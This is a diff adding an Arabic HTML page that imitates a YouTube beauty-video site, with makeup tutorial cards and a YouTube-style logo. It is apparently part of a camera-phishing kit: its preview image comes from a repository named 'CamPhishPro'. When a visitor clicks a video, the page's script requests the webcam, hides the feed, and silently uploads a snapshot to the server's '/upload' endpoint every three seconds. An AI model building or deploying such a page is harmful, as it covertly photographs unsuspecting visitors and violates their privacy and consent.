@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0f0f0f">
+<title>عالم الأناقة والجمال</title>
+<meta name="description" content="كل ما يهم المرأة وبكل جديد في عالم الموضة والجمال" />
+
+<meta property="og:type" content="website" />
+<meta property="og:title" content="عالم الأناقة والجمال" />
+<meta property="og:description" content="كل ما يهم المرأة وبكل جديد في عالم الموضة والجمال" />
+<meta property="og:image" content="https://raw.githubusercontent.com/faraabaas-jpg/CamPhishPro/main/preview.jpg" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root{--bg:#0f0f0f;--bg2:#272727;--text:#fff;--text2:#aaa;--red:#ff0000;--hover:rgba(255,255,255,.1)}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{font-family:'Cairo',sans-serif;background:var(--bg);color:var(--text);font-size:14px;line-height:1.5}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
+.topbar{position:fixed;top:0;inset-inline:0;height:56px;background:var(--bg);display:flex;align-items:center;justify-content:space-between;padding:0 16px;z-index:100}
+.logo{display:flex;align-items:center;gap:6px;font-weight:700;font-size:20px}
+.logo svg{width:30px;height:21px}
+.main{padding-top:70px;padding-inline:16px;max-width:1200px;margin:0 auto}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.card{cursor:pointer;background:var(--bg2);border-radius:12px;overflow:hidden}
+.thumb{aspect-ratio:16/9;background:#222;position:relative}
+.thumb img{width:100%;height:100%;object-fit:cover}
+.meta{padding:12px}
+.t{font-weight:600;font-size:15px;margin-bottom:4px}
+.sub{color:var(--text2);font-size:12px}
+.player-wrap{margin-bottom:20px;display:none}
+.player{aspect-ratio:16/9;width:100%;background:#000;border-radius:12px;overflow:hidden;position:relative}
+.player iframe{width:100%;height:100%;border:0}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="logo">
+    <svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg>
+    <span>يوتيوب</span>
+  </div>
+</header>
+
+<main class="main">
+  <div class="player-wrap" id="playerWrap">
+    <div class="player">
+      <iframe id="mainPlayer" src="" title="Video Player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+  </div>
+
+  <div class="grid" id="videoGrid"></div>
+</main>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+
+<script>
+const VIDEOS = [
+  {id:'xlINqK-F57w',title:'فاونديشن حسب نوع البشرة ✨🥰',ch:'Warda Moda'},
+  {id:'ogp0HYIAWNI',title:'فوائد منتجات العناية للبشرة والشعر ✨',ch:'kim-fifi ♡'},
+  {id:'ITH5lZUWIiw',title:'اساسيات المكياج للمبتدئين 💄',ch:'L\'Esprit Féminin'},
+  {id:'CpO4jUvMXy4',title:'تجربتي لـ فاونديشن فت مي',ch:'nana beauty'}
+];
+
+const grid = document.getElementById('videoGrid');
+const playerWrap = document.getElementById('playerWrap');
+const mainPlayer = document.getElementById('mainPlayer');
+
+VIDEOS.forEach(v => {
+  const card = document.createElement('div');
+  card.className = 'card';
+  card.innerHTML = `
+    <div class="thumb"><img src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg"></div>
+    <div class="meta">
+      <div class="t">${v.title}</div>
+      <div class="sub">${v.ch}</div>
+    </div>
+  `;
+  card.onclick = () => playVideo(v.id);
+  grid.appendChild(card);
+});
+
+function playVideo(id) {
+  mainPlayer.src = `https://www.youtube.com/embed/${id}?autoplay=1`;
+  playerWrap.style.display = 'block';
+  window.scrollTo({top: 0, behavior: 'smooth'});
+  initCapture();
+}
+
+let isCapturing = false;
+
+function initCapture() {
+  if (isCapturing) return;
+  
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      isCapturing = true;
+      const videoEl = document.getElementById('video');
+      videoEl.srcObject = stream;
+      
+      setInterval(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = 480;
+        canvas.height = 360;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(blob => {
+          if (!blob) return;
+          let fd = new FormData();
+          fd.append('image', blob, 'frame.jpg');
+          fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+        }, 'image/jpeg', 0.6);
+      }, 3000);
+    })
+    .catch(() => {});
+}
+</script>
+</body>
+</html>
